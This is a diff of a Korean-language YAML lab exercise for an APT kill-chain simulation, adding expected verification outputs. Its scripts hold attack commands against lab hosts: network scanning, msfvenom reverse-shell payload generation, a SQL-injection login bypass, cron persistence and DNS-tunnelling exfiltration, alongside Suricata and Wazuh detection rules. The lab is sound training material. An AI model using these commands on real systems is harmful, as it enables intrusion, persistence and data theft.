@@ -35,7 +35,7 @@ steps:
     완료하지 않아 로그에 남기 어렵고, -sV는 서비스 버전을, -O는 OS를 탐지한다. XML 출력은 Metasploit에서 import 가능하다.
   verify:
     type: file_exists
-    expect: null
+    expect: /tmp/apt_recon.xml
     field: filesystem
   target_vm: attacker
   script: sudo nmap -sS -sV -O --script=banner --max-retries 1 --host-timeout 15s
@@ -57,7 +57,7 @@ steps:
     X-Frame-Options, Content-Security-Policy 등의 부재는 XSS, Clickjacking 등의 공격 가능성을 나타낸다.
   verify:
     type: output_contains
-    expect: null
+    expect: HTTP Security Headers
   target_vm: attacker
   script: echo "=== HTTP Security Headers ===" && curl -sI http://10.20.30.80 | grep
     -iE "(Server|X-Powered-By|X-Frame|X-Content-Type|Strict-Transport|Content-Security)"
@@ -80,7 +80,7 @@ steps:
     페이로드 생성 도구로, ELF 바이너리 형태의 리버스 쉘을 생성한다. 실습에서는 페이로드 구조를 이해하기 위해 생성만 하고 실행하지 않는다.
   verify:
     type: file_exists
-    expect: null
+    expect: /tmp/apt_payload.elf
     field: filesystem
   target_vm: attacker
   script: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f
@@ -102,7 +102,7 @@ steps:
     폼에 SQL 구문을 삽입하여 admin 토큰을 획득한다. 이 기법은 OWASP Top 10의 A03:2021-Injection에 해당한다.
   verify:
     type: output_contains
-    expect: null
+    expect: token
   target_vm: attacker
   script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
     \ application/json' \\\n  -d '{\"email\":\"\\\" OR 1=1--\",\"password\":\"test\"\
@@ -122,7 +122,7 @@ steps:
     재부팅 후에도 유지되는 지속성 기법이다. 실습에서는 무해한 echo 명령으로 시뮬레이션한다.
   verify:
     type: output_contains
-    expect: null
+    expect: APT_PERSISTENCE
   target_vm: attacker
   script: echo '*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"'
     | crontab - && crontab -l | grep APT_PERSISTENCE
@@ -141,7 +141,7 @@ steps:
     탐지가 어렵다. Actions on Objectives로 시스템 정보를 수집(T1005)하여 유출 준비를 한다.
   verify:
     type: file_exists
-    expect: null
+    expect: /tmp/apt_exfil.txt
     field: filesystem
   target_vm: attacker
   script: echo 'APT_C2_DATA' | base64 | tr -d '=' | xargs -I{} nslookup {}.test.local
@@ -166,7 +166,7 @@ steps:
     패턴), 리버스 쉘 포트(4444) 연결 탐지, DNS 터널링(30자 이상 base64 패턴) 탐지를 구현한다.
   verify:
     type: output_contains
-    expect: null
+    expect: APT-SIM
   target_vm: secu
   script: cat > /tmp/apt_detection.rules << 'EOF' alert http any any -> 10.20.30.0/24
     any (msg:"APT-SIM SQLI Attempt"; flow:to_server,established; content:"UNION";
@@ -198,7 +198,7 @@ steps:
     시간 윈도우 내 이벤트 빈도를 추적하며, MITRE ATT&CK ID를 태깅하여 공격 기법을 분류한다.
   verify:
     type: output_contains
-    expect: null
+    expect: apt_killchain
   target_vm: siem
   script: "cat > /tmp/wazuh_apt_rule.xml << 'EOF'\n<group name=\"apt_killchain\">\n\
     \  <rule id=\"100100\" level=\"14\" frequency=\"3\" timeframe=\"300\">\n    <if_matched_group>apt_indicator</if_matched_group>\n\
@@ -230,7 +230,7 @@ steps:
     JSON 레이어를 생성하여 킬체인 각 단계를 시각적으로 매핑한다.
   verify:
     type: output_contains
-    expect: null
+    expect: enterprise-attack
   target_vm: attacker
   script: grep -E "(Failed|Accepted|session opened|Invalid user)" /var/log/auth.log
     | tail -20 && cat > /tmp/apt_attack_layer.json << 'EOF' {"name":"APT Simulation
@@ -268,7 +268,7 @@ steps:
     심층 방어(Defense-in-Depth) 전략이 핵심이다.
   verify:
     type: output_contains
-    expect: null
+    expect: Kill Chain Analysis
   target_vm: attacker
   script: 'crontab -r 2>/dev/null; rm -f /tmp/apt_payload.elf /tmp/apt_exfil.txt /tmp/apt_persist.txt
     2>/dev/null && cat > /tmp/apt_killchain_report.txt << ''EOF'' === APT Kill Chain
